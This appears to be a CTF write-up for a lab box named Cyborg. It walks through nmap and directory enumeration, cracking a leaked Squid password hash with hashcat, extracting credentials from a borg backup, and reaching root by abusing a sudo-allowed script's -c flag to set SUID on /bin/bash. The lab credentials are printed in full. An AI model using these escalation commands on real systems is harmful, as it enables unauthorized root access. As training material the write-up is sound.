

## Overview

This box contains a Squid proxy configuration, a leaked hash, and a `borgbackup` repository. We perform enumeration, crack credentials, extract files, and escalate to root using a misconfigured backup script.
P.S dont forget to add IP to /etc/hosts if desirable. !? 
---

## Nmap Scan

nmap -sS -sV -T4 -p- cyborg.thm

Open Ports

    22 - SSH (OpenSSH 7.2p2)

    80 - HTTP (Apache 2.4.18)

Directory Enumeration

Using feroxbuster:

    http://cyborg.thm/admin/

    http://cyborg.thm/etc/ → Directory listing enabled

    http://cyborg.thm/etc/squid/ → Directory listing enabled

    Interesting files:

        /etc/squid/passwd

        /etc/squid/squid.conf

        /admin/archive.tar

        /admin/*.html, *.jpeg, etc.

Credential Discovery

Found hash in:

http://cyborg.thm/etc/squid/passwd
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Cracked Using Hashcat

hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

    Username: music_archive

    Password: squidward

Borg Backup

The website references borgbackup. Based on the README, it's clear a backup archive is present.
Steps:

    Install borg:

sudo apt install borgbackup

Extract archive:

borg extract /home/ivo/Downloads/archive::music_archive

Found in Documents/note.txt:

    alex:S3cretP@s3

Privilege Escalation
Using sudo -l

# sudo -l #

Output:

User alex may run the following commands on ubuntu:
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

Inspecting backup.sh, it accepts a -c flag:

while getopts c: flag
do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done
cmd=${command}

Get Root Access

Run:

sudo /etc/mp3backups/backup.sh -c whoami

Output:

root

Spawn Root Shell via SUID

    Set SUID on bash:

sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"

Run:

bash -p

Access the root flag:

cd /root
cat root.txt
